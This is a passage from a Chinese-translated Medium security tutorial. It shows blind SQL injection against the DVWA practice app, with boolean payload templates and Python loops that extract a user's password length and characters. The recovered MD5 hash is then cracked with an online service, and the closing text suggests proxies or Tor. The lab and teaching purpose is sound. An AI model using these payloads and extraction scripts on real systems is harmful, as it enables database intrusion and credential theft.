mu lc mm mn mo mp bi translated">密码本身</li></ul><p id="3bed" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">获取密码长度的有效负载是:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="3090" class="nh li it nd b gy ni nj l nk nl">1 AND LENGTH((SELECT {} FROM {} WHERE {}={}))={} #</span></pre><p id="9ab6" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">正如我们之前所做的，我们可以使用以下python代码注入有效负载:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="ecc5" class="nh li it nd b gy ni nj l nk nl">query = queries["pwd_len"]<br/>pwd_length = 0<br/>for i in range(100):<br/>    <br/>    if get_query_result(s, sqli_blind_url, query, passwords_column, users_table, users_column, get_hex_str(username), i ):<br/>        pwd_length = i<br/>        print(f"[+] The password length is: {i}")</span></pre><p id="f683" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">脚本的最后一步是定义有效负载和运行它的代码。</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="b3ff" class="nh li it nd b gy ni nj l nk nl">1 AND SUBSTR((SELECT {} FROM {} WHERE {}={} LIMIT 1), {}, 1)={} #</span></pre><p id="2a23" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这将由以下代码运行。</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="6643" class="nh li it nd b gy ni nj l nk nl">query = queries["pwd"]<br/>password = []<br/>for j in range(1, pwd_length+1):<br/>    <br/>    for c in string.ascii_letters+string.digits:<br/>        <br/>        if get_query_result(s, sqli_blind_url, query, passwords_column, users_table, users_column, get_hex_str(username), j, get_hex_str(c)):<br/>            password.append(c)<br/>            <br/>            break<br/>print("[+] Password is: ","".join(password))</span></pre><p id="6ae1" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">python脚本已经完成，现在运行它。</p><h1 id="068c" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">步骤6:在中等安全级别的DVWA上运行盲SQL注入Python脚本。</h1><p id="d225" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">将脚本保存在名为“main.py”的文件中，可以通过键入以下命令从命令行运行:</p><pre class="my mz na nb gt nc nd ne nf aw ng bi"><span id="06f4" class="nh li it nd b gy ni nj l nk nl">python main.py</span></pre><figure class="my mz na nb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nt"><img src="../Images/e037eb4d299a900fe61fd36b41d4148a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*tznJ-Xwmgmo78Hb2.jpg"/></div></div></figure><p id="35b0" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">密码显然是一个<a class="ae ld" href="https://en.wikipedia.org/wiki/Hash_function" rel="noopener ugc nofollow" target="_blank">哈希函数</a>的结果，很可能是<a class="ae ld" href="https://en.wikipedia.org/wiki/MD5" rel="noopener ugc nofollow" target="_blank"> MD5 </a>。</p><p id="5381" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">破解可以通过使用类似<a class="ae ld" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank"> CrackStation </a>的在线工具来完成。</p><p id="eb39" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">所以，我们可以去<a class="ae ld" href="https://crackstation.net/" rel="noopener ugc nofollow" target="_blank">破解站</a>尝试破解它:</p><figure class="my mz na nb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nu"><img src="../Images/b39ee898cf9ba65d4b223fcb07b10e08.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Ln0K2_3-avsdrewT.jpg"/></div></div></figure><h1 id="e6a0" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">第7步:最终概述。</h1><p id="6d23" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">您可能想看完整的代码，所以下面是完整代码的概述:</p><figure class="my mz na nb gt ju"><div class="bz fp l di"><div class="nv nw l"/></div></figure><h1 id="c67a" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">结论</h1><p id="b469" class="pw-post-body-paragraph ke kf it kh b ki mh kk kl km mi ko kp le mv ks kt lf mw kw kx lg mx la lb lc im bi translated">我希望你喜欢这篇文章，我真的很喜欢写它(尤其是编码部分)。<br/>我知道有很多工具在这方面做得更好，并且可广泛配置，但这是最好的学习方式，而且在某些情况下，你可能会在职业生涯中被迫这样做。</p><p id="5cf8" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">除此之外，请记住，这个脚本可以修改工作线程，也许代理或tor网络，你可以用这些知识做很多事情！</p><p id="6d0f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">感谢您的时间，感谢您的每一个反馈。如果你喜欢我的作品，请继续关注我的博客和社交网站！</p></div><div class="ab cl nx ny hx nz" role="separator"><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc"/></div><div class="im in io ip iq"><p id="896b" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em class="kg">你可以通过下面的链接注册，每月只需5美元就可以获得所有的媒体报道</em></p><div class="oe of gp gr og oh"><a href="https://medium.com/membership/@stackzero" rel="noopener follow" target="_blank"><div class="oi ab fo"><div class="oj ab ok cl cj ol"><h2 class="bd iu gy z fp om fr fs on fu fw is bi translated">通过我的推荐链接加入Medium-stack zero</h2><div class="oo l"><h3 class="bd b gy z fp om fr fs on fu fw dk translated">我们的最新报道(以及数以千计的其他报道)一经发布，您就可以立即获得。成为会员后，您将获得所有权限…</h3></div><div class="op l"><p class="bd b dl z fp om fr fs on fu fw dk translated">medium.com</p></div></div><div class="oq l"><div class="or l os ot ou oq ov jz oh"/></div></div></a></div></div><div class="ab cl nx ny hx nz" role="separator"><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc"/></div><div class="im in io ip iq"><p id="74fb" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em class="kg">原载于2022年10月26日https://www.stackzero.net</em><a class="ae ld" href="https://www.stackzero.net/blind-sql-injection-dvwa-medium-security-with-python/" rel="noopener ugc nofollow" target="_blank"><em class="kg"/></a><em class="kg">。</em></p></div><div class="ab cl nx ny hx nz" role="separator"><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc"/></div><div class="im in io ip iq"><h2 id="a622" class="nh li it bd lj ow ox dn ln oy oz dp lr le pa pb lv lf pc pd lz lg pe pf md pg bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ld" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>